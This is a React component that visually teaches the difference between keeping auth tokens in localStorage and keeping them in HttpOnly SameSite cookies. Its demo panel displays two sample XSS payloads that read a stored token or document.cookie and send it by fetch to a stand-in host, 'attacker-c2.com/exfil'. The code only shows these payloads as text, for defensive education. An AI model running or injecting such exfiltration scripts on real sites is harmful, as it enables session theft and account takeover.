'use client';

import React, { useState } from 'react';
import { ArrowRight, CheckCircle2, Cookie, Database, Lock, ShieldAlert, ShieldCheck, Sparkles, XCircle, Zap } from 'lucide-react';

type StorageMode = 'localstorage' | 'httponly-cookie';

export function SessionVsTokenVisualizer() {
  const [mode, setMode] = useState<StorageMode>('httponly-cookie');

  return (
    <div className="rounded-3xl border border-emerald-500/30 bg-emerald-500/5 dark:bg-emerald-500/10 p-6 sm:p-8 space-y-6 shadow-xl my-8">
      <div className="flex flex-wrap items-center justify-between gap-3 border-b border-emerald-500/20 pb-4">
        <div className="flex items-center gap-2.5">
          <div className="w-10 h-10 rounded-xl bg-emerald-600 text-white flex items-center justify-center font-bold shadow-md">
            <Cookie className="w-5 h-5" />
          </div>
          <div>
            <div className="text-xs uppercase font-extrabold tracking-wider text-emerald-600 dark:text-emerald-400">
              Web Storage &amp; Attack Surface
            </div>
            <h3 className="text-xl font-bold text-foreground">
              HttpOnly SameSite Cookies vs LocalStorage Tokens
            </h3>
          </div>
        </div>

        <span className={`px-3 py-1 rounded-full font-mono text-xs font-bold ${
          mode === 'httponly-cookie'
            ? 'bg-emerald-500/20 text-emerald-700 dark:text-emerald-300'
            : 'bg-rose-500/20 text-rose-700 dark:text-rose-300'
        }`}>
          {mode === 'httponly-cookie' ? '🛡️ IMMUNE TO XSS TOKEN EXFILTRATION' : '🚨 VULNERABLE TO XSS THEFT'}
        </span>
      </div>

      {/* Mode Switcher */}
      <div className="grid grid-cols-2 gap-4 font-mono text-xs">
        <button
          onClick={() => setMode('localstorage')}
          className={`p-3.5 rounded-2xl border text-left transition-all ${
            mode === 'localstorage'
              ? 'bg-rose-600 text-white font-bold shadow-md border-rose-500'
              : 'bg-card border-border text-foreground hover:border-emerald-500'
          }`}
        >
          <div className="font-bold">1. LocalStorage (Bearer Token)</div>
          <div className={`text-[10px] ${mode === 'localstorage' ? 'text-rose-100' : 'text-muted-foreground'}`}>
            localStorage.setItem("token", jwt)
          </div>
        </button>

        <button
          onClick={() => setMode('httponly-cookie')}
          className={`p-3.5 rounded-2xl border text-left transition-all ${
            mode === 'httponly-cookie'
              ? 'bg-emerald-600 text-white font-bold shadow-md border-emerald-500'
              : 'bg-card border-border text-foreground hover:border-emerald-500'
          }`}
        >
          <div className="font-bold">2. HttpOnly Cookie (Recommended)</div>
          <div className={`text-[10px] ${mode === 'httponly-cookie' ? 'text-emerald-100' : 'text-muted-foreground'}`}>
            Set-Cookie: token=...; HttpOnly; Secure; SameSite=Lax
          </div>
        </button>
      </div>

      {/* Simulated Attack Script */}
      <div className="p-6 rounded-3xl bg-slate-950 text-slate-100 border border-slate-800 space-y-3 font-mono text-xs shadow-inner">
        <div className="flex items-center justify-between border-b border-slate-800 pb-2">
          <span className="text-slate-400">Simulated Malicious XSS Script Execution:</span>
          <span className={mode === 'httponly-cookie' ? 'text-emerald-400 font-bold' : 'text-rose-400 font-bold'}>
            {mode === 'httponly-cookie' ? 'Attack Blocked by Browser' : 'Credentials Exfiltrated!'}
          </span>
        </div>

        {mode === 'localstorage' ? (
          <div className="space-y-2 text-[11px]">
            <pre className="p-2.5 rounded-xl bg-rose-950/40 border border-rose-800/50 text-rose-300">
{`// Malicious XSS Payload executed by compromised npm package:
const stolenToken = localStorage.getItem("access_token");
fetch("https://attacker-c2.com/exfil?t=" + encodeURIComponent(stolenToken));`}
            </pre>
            <div className="text-rose-400 font-bold flex items-center gap-1.5">
              <XCircle className="w-4 h-4" /> 🚨 Token leaked to attacker server in 2ms! Full account takeover.
            </div>
          </div>
        ) : (
          <div className="space-y-2 text-[11px]">
            <pre className="p-2.5 rounded-xl bg-emerald-950/40 border border-emerald-800/50 text-emerald-300">
{`// Malicious XSS Payload attempts to access cookie:
const stolenToken = document.cookie; // Returns "" (Empty string!)
fetch("https://attacker-c2.com/exfil?t=" + stolenToken);`}
            </pre>
            <div className="text-emerald-400 font-bold flex items-center gap-1.5">
              <CheckCircle2 className="w-4 h-4" /> 🛡️ HttpOnly flag prevents JavaScript from accessing token! Exfiltration completely failed.
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
